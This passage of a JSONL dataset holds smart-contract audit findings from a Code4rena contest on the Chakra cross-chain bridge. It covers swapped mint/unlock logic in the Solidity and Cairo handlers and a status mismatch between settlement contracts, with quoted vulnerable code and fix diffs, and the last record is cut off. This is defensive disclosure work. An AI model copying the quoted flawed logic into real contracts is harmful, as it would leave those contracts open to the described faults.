decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n-               erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n+               token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n-               token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n+               erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n```\n\n\n\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\n`LockMint` and `BurnUnlock` modes refer to the following:\n\n- `LockMint`: Tokens are locked on the source chain and minted on the target chain.\n- `BurnUnlock`: Tokens are burned on the source chain and unlocked on the target chain.\n\nHowever, because the `ChakraSettlementHandler` protocol is responsible for both processing remote `cross-chain messages` and sending `cross-chain messages` to remote chains, a single mode setting cannot handle both tasks simultaneously. This results in one of the tasks' functionalities being unavailable due to incorrect protocol implementation.\n", "recommendation_md": "## Recommended Mitigation Steps\nThe following is the correct logic:\n```diff\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n-                   _erc20_mint(\n-                       AddressCast.to_address(transfer_payload.to),\n-                       transfer_payload.amount\n-                   );\n+                   _erc20_unlock(\n+                       AddressCast.to_address(transfer_payload.to),\n+                       transfer_payload.amount\n+                   );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n-                   _erc20_unlock(\n-                       AddressCast.to_address(transfer_payload.to),\n-                       transfer_payload.amount\n-                   );\n+                   _erc20_mint(\n+                       AddressCast.to_address(transfer_payload.to),\n+                       transfer_payload.amount\n+                   );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\nIn Cairo:\n```diff\n    impl ERC20HandlerImpl of IERC20Handler<ContractState> {\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n-               erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n+               token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n-               token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n+               erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n```\n\n\n\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\nWhen the `LockMint` mode is used, it means that the source chain employs the `LockUnlock` mode. Therefore, during the receive cross-chain message, tokens should not be minted but rather unlocked.\n\nSimilarly, when the `BurnUnlock` mode is used, it means that the source chain employs the `MintBurn` mode. Thus, during the receive cross-chain message, tokens should not be unlocked but rather minted.\n\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        ...\n        if (payload_type == PayloadType.ERC20) {\n            {\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n                if (mode == SettlementMode.MintBurn) {\n                    ...\n                } else if (mode == SettlementMode.LockUnlock) {\n                    ...\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n        ...\n    }\n```\n\n\nIn the Cairo program, the same issue also exists.\n```rust\n    #[abi(embed_v0)]\n    impl ERC20HandlerImpl of IERC20Handler<ContractState> {\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L127\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L338\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L127\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L127\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L338\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L127\n\n\n# Vulnerability details\n\n## Impact\n`LockMint` and `BurnUnlock` modes refer to the following:\n\n- `LockMint`: Tokens are locked on the source chain and minted on the target chain.\n- `BurnUnlock`: Tokens are burned on the source chain and unlocked on the target chain.\n\nHowever, because the `ChakraSettlementHandler` protocol is responsible for both processing remote `cross-chain messages` and sending `cross-chain messages` to remote chains, a single mode setting cannot handle both tasks simultaneously. This results in one of the tasks' functionalities being unavailable due to incorrect protocol implementation.\n\n\n## Proof of Concept\nWhen the `LockMint` mode is used, it means that the source chain employs the `LockUnlock` mode. Therefore, during the receive cross-chain message, tokens should not be minted but rather unlocked.\n\nSimilarly, when the `BurnUnlock` mode is used, it means that the source chain employs the `MintBurn` mode. Thus, during the receive cross-chain message, tokens should not be unlocked but rather minted.\n\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        ...\n        if (payload_type == PayloadType.ERC20) {\n            {\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n                if (mode == SettlementMode.MintBurn) {\n                    ...\n                } else if (mode == SettlementMode.LockUnlock) {\n                    ...\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n        ...\n    }\n```\n\n\nIn the Cairo program, the same issue also exists.\n```rust\n    #[abi(embed_v0)]\n    impl ERC20HandlerImpl of IERC20Handler<ContractState> {\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n```\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nThe following is the correct logic:\n```diff\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n-                   _erc20_mint(\n-                       AddressCast.to_address(transfer_payload.to),\n-                       transfer_payload.amount\n-                   );\n+                   _erc20_unlock(\n+                       AddressCast.to_address(transfer_payload.to),\n+                       transfer_payload.amount\n+                   );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n-                   _erc20_unlock(\n-                       AddressCast.to_address(transfer_payload.to),\n-                       transfer_payload.amount\n-                   );\n+                   _erc20_mint(\n+                       AddressCast.to_address(transfer_payload.to),\n+                       transfer_payload.amount\n+                   );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\nIn Cairo:\n```diff\n    impl ERC20HandlerImpl of IERC20Handler<ContractState> {\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n-               erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n+               token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n-               token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n+               erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n```\n\n\n\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L127\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L338\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L127\n\n\n# Vulnerability details\n\n## Impact\n`LockMint` and `BurnUnlock` modes refer to the following:\n\n- `LockMint`: Tokens are locked on the source chain and minted on the target chain.\n- `BurnUnlock`: Tokens are burned on the source chain and unlocked on the target chain.\n\nHowever, because the `ChakraSettlementHandler` protocol is responsible for both processing remote `cross-chain messages` and sending `cross-chain messages` to remote chains, a single mode setting cannot handle both tasks simultaneously. This results in one of the tasks' functionalities being unavailable due to incorrect protocol implementation.\n\n\n## Proof of Concept\nWhen the `LockMint` mode is used, it means that the source chain employs the `LockUnlock` mode. Therefore, during the receive cross-chain message, tokens should not be minted but rather unlocked.\n\nSimilarly, when the `BurnUnlock` mode is used, it means that the source chain employs the `MintBurn` mode. Thus, during the receive cross-chain message, tokens should not be unlocked but rather minted.\n\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        ...\n        if (payload_type == PayloadType.ERC20) {\n            {\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n                if (mode == SettlementMode.MintBurn) {\n                    ...\n                } else if (mode == SettlementMode.LockUnlock) {\n                    ...\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n        ...\n    }\n```\n\n\nIn the Cairo program, the same issue also exists.\n```rust\n    #[abi(embed_v0)]\n    impl ERC20HandlerImpl of IERC20Handler<ContractState> {\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) && \n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n            \n            return true;\n        }\n```\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nThe following is the correct logic:\n```diff\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n-                   _erc20_mint(\n-                       AddressCast.to_address(transfer_payload.to),\n-                       transfer_payload.amount\n-                   );\n+                   _erc20_unlock(\n+                       AddressCast.to_address(transfer_payload.to),\n+                       transfer_payload.amount\n+                   );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n-                   _erc20_unlock(\n-                       AddressCast.to_address(transfer_payload.to),\n-                       transfer_payload.amount\n-                   );\n+                   _erc20_mint(\n+                       AddressCast.to_address(transfer_payload.to),\n+                       transfer_payload.amount\n+                   );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\nIn Cairo:  \n```diff\n    impl ERC20HandlerImpl of IERC20Handler<ContractState> {\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) && \n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n-               erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n+               token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n-               token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n+               erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n            \n            return true;\n        }\n```\n\n\n\n\n\n## Assessed type\n\nOther"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-038", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 38, "page_start": null, "title": "Mismatch in the message status between ChakraSettlement and ChakraSettlementHandler", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\n\n# Vulnerability details\n\n## Impact\nThere is a mismatch in the message status between `ChakraSettlement` and `ChakraSettlementHandler`.\n\n## Proof of Concept\nWhen a callback message is received, if `is_valid_handler` returns `false`, the status of the message in `ChakraSettlementHandler` is not updated.\n\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        //.....\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\nHowever, the status is updated only in `ChakraSettlement`.\n\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        //....\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L329\n\nThis means that the message status will remain `PENDING` in `ChakraSettlementHandler`, while it will be `FAILED` in `ChakraSettlement`. This inconsistency breaks the invariant that \"Cross-chain transaction statuses are properly tracked and updated (Pending, Settled, or Failed).\"\n\n## Tools Used\n\n## Recommended Mitigation Steps\nThe following change is recommended:\n\n```diff\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n+           create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "## Impact\nThere is a mismatch in the message status between `ChakraSettlement` and `ChakraSettlementHandler`.\n", "recommendation_md": "## Recommended Mitigation Steps\nThe following change is recommended:\n\n```diff\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n+           create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\n\n## Assessed type\n\nContext\n", "poc_md": "## Proof of Concept\nWhen a callback message is received, if `is_valid_handler` returns `false`, the status of the message in `ChakraSettlementHandler` is not updated.\n\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        //.....\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\nHowever, the status is updated only in `ChakraSettlement`.\n\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        //....\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    